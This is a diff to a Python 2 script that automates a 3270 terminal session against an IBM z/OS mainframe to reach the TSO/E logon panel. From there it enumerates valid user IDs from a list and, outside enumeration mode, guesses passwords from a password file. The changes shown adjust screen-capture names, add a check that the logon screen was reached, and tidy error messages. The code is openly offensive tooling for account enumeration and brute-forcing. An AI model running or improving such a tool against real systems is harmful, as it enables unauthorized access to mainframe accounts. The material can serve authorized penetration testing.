@@ -47,19 +47,19 @@ def Get_TSO_PANEL():
 	##### CHANGE THE SECTION BELOW FOR YOUR CUSTOM ENVIRONMENT
 	##### THE POINT IS TO GET TO THE TSO LOGIN SCREEN WITH AN INVALID USER ID
 	#################################
-	em.wait_for_field()
-	em.exec_command('PrintText(html,screen_tso.html)')
-	em.send_string('tso') #Sends 'tso' to the screen to launch TSO. The first and second number are where the cursor goes, the 'tso' is the text to send 
-	em.exec_command('PrintText(html,screen_tso.html)')
+	em.send_enter()
+	em.send_string('TSO') #Sends 'tso' to the screen to launch TSO. The first and second number are where the cursor goes, the 'tso' is the text to send 
+	em.exec_command('PrintText(html,tso_screen.html)')
 	em.send_enter() #presses 'enter' on the keyboard
-	em.exec_command('PrintText(html,screen_tso.html)')
+	em.exec_command('PrintText(html,tso_screen.html)')
 	time.sleep(results.sleep) #sleeps, because generally mainframes take a while to process these things
-	em.exec_command('PrintText(html,screen_tso.html)')
-	print 'sending TSOFAKE'
+	#em.exec_command('string(TSOFAKE)')
+	em.exec_command('Wait(InputField)')
 	em.send_string('TSOFAKE') #This is the user ID we pass to TSO the first time you logon. You can change this to whatever you like, but it must be less than 7 characters long and it MUST be an invalid TSO user. 
-	em.exec_command('PrintText(html,screen_tso.html)')
+	em.exec_command('PrintText(html,tso_screen.html)')
+	time.sleep(results.sleep)
 	em.send_enter() 
-
+	em.exec_command('PrintText(html,tso_screen.html)')
 	
 	#################################
 	##### AT THIS POINT WE'RE AT THE LOGON PROMPT
@@ -117,10 +117,9 @@ userfile=open(results.userfile) #open the usernames file
 if not results.enumeration: print '[+]--------------- Password Listing    =', results.passfile
 print '[+]--------------- Wait in Seconds     =', results.sleep
 print '[+]--------------- Attack platform     =', platform.system() 
-print '=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-'
 
 if not results.passfile and not results.enumeration: #A pssword file is required if we're not in enumeration mode
-	sys.exit("[!]--------------- Not in Enumeration mode (-e). Password file (-p) required! Aborting")
+	sys.exit("[!]--------------- Not in Enumeration mode (-e). Password file (-p) required! Aborting.")
 
 if results.movie_mode and not platform.system() == 'Windows':
         if not results.quiet: print '[+]--------------- ULTRA AWESOME Hacker Movie Mode: ENABLED!!'
@@ -135,16 +134,23 @@ if results.quiet: print '[+]--------------- Quiet Mode Enabled: Shhhhhhhhh!'
 print '[+]--------------- Connecting to ', results.target
 connect = Connect_to_ZOS()
 if not em.is_connected():
-	print '[!]--------------- Could not connect to ', results.target, 'aborting'
+	print '[!]--------------- Could not connect to ', results.target, '. Aborting.'
 	sys.exit()
 print '[+]--------------- Getting to TSO/E Logon Panel'
 connect = Get_TSO_PANEL()
+#make sure we're actually at the TSO logon screen
+if not em.string_found(06, 20, 'TSO/E LOGON'):
+	sys.exit('[!]--------------- Not at TSO/E Logon screen. Aborting.')
+
 print '                  |- At TSO/E Logon Panel'
 time.sleep(results.sleep)
 
 print '                  |- Starting Enumeration'
 
 valid_users = list() #A 1d array to hold the found user IDs. Displays all users IDs at the end. 
+
+
+
 
 for username in userfile:
 	if username[0].isdigit():
